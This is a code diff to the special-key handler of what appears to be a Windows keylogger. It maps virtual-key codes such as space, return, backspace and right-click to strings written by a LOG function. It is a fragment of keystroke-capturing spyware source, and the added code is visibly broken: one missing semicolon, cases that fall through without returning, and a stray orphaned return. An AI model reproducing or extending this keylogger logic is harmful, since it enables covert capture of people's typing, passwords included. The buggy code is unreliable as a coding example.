@@ -23,30 +23,34 @@ void LOG(string input) {
 
 
 bool SpecialKeys(int S_Key) {
+
+    // handle special keys
+    // https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 	switch (S_Key) {
+
+	    case VK_RBUTTON:
+            LOG("#R-CLICK#");
 
         case VK_SPACE:
             LOG(" ");
+            return true;
+
+        case VK_CANCEL:
+            LOG("#VK_CANCEL")
+
+        case '¾':
+            LOG(".");
             return true;
 
         case VK_RETURN:
             LOG("\n");
             return true;
 
-        case '¾':
-            LOG(".");
-            return true;
-
-        case VK_SHIFT:
-            LOG("#SHIFT#");
-            return true;
-
         case VK_BACK:
             LOG("\b");
             return true;
 
-        case VK_RBUTTON:
-            LOG("#R-CLICK#");
+
             return true;
 
         case VK_MENU:
